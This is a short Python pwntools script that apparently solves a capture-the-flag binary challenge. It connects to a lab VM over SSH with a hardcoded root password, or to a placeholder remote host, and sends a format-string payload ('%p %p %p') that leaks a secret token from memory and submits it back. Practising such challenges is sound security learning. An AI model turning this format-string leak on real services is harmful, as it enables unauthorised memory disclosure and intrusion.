from pwn import *

VM_HOST, VM_PORT = "192.168.10.135", 22 # My VM Server
HOST, PORT = "addr", 1234
cwd = "/root/workbench/PWN/pwn04/p01"

exe = ELF("./chall",checksec=False)
context.binary = exe
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        sh = ssh(host=VM_HOST, port=VM_PORT, user="root", password="password")
        p = sh.process([f"{cwd}/chall"], cwd=cwd)
        gdb.attach(p)
    else:
        p = remote(HOST, PORT)
    return p

def main():
    # === Alias === #
    p = conn()
    s = p.send
    sl = p.sendline
    sla = p.sendlineafter
    sa = p.sendafter
    r = p.recv
    ru = p.recvuntil
    rn = p.recvn
    rl = p.recvline
    # === Exploit === #
    log.info("happy pwn!")
    sla(b"format> ", b"%p %p %p")
    ru(b"1111 ")
    token = int(rn(18), 16)
    log.success(f"token = {hex(token)}")
    sla(b"hex> ", hex(token).encode())
    # =============== #
    p.interactive()

if __name__ == "__main__":
    main()